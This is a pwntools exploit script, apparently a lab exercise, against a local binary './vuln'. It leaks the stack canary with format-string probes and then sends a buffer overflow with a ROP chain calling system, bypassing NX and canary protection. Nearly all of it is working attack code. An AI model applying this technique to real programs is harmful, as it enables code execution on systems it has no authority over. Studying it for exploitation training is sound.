# Script to exploit NX, Canary defense.

from pwn import *
import re

exe = context.binary = ELF('./vuln')

# Using pattc, patto to find the offset.
# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
numOfPads = 1352

# 0x7fffffffdab0 in the middle of the NOPs.
bin_sh = 0x7ffff7f785bd
ret = 0x40117e
pop_rdi = 0x4012a3
system = 0x7ffff7e16290
exit = 0x7ffff7e0aa40
id = 0x7ffff7dd5ed6

# Lists to store the possible positions and its respective values.
possible = []
vals = []

def findPosition():
    for i in range(750):
        print("[+] Spawning process...")

        io = process(['./vuln' , f"%{i}$llx\n"])

        try:
            canary = int(io.read().decode().strip().replace(";", ""), 16)

            print("[+] Canary leaked:{}".format(hex(canary)))
        except:
            io.close()
            continue

        # Similarly, it does run the shell but doesn't spawn it...
        payload = b"test"

        with open('payload','wb') as f:
            f.write(payload)

        io.sendline(payload)
        if re.match(r'0x.{14}00$', str(hex(canary))):
            possible.append(i)
            vals.append(hex(canary))
        io.close()
    print(possible)
    print(vals)

def exploit():
    print("[+] Spawning process...")

    io = process(['./vuln' , "%177$llx\n"])
    canary = int(io.read().decode().strip(), 16)
    print("[+] Canary leaked:{}".format(hex(canary)))

    # Similarly, it does run the shell but doesn't spawn it...
    payload = b"\x90" * (numOfPads) # 8 for canary, another 8 for rbp
    payload += p64(canary) # canary
    payload += b"\x90" * 8 # To make it 16 byte aligned.
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(id)
    payload += p64(system)
    payload += p64(exit)

    with open('payload','wb') as f:
        f.write(payload)
    io.sendline(payload)
    data = io.read()
    print(data.decode())
    # Due a very unlikely instance of the stack smashing still occurring.
    if "smashing" in data.decode():
        exploit()

def sanity():
    test = "9a788e1b43e9a100"
    if re.match(r'.*00$', test):
        print("yes")

# findPosition()
exploit()
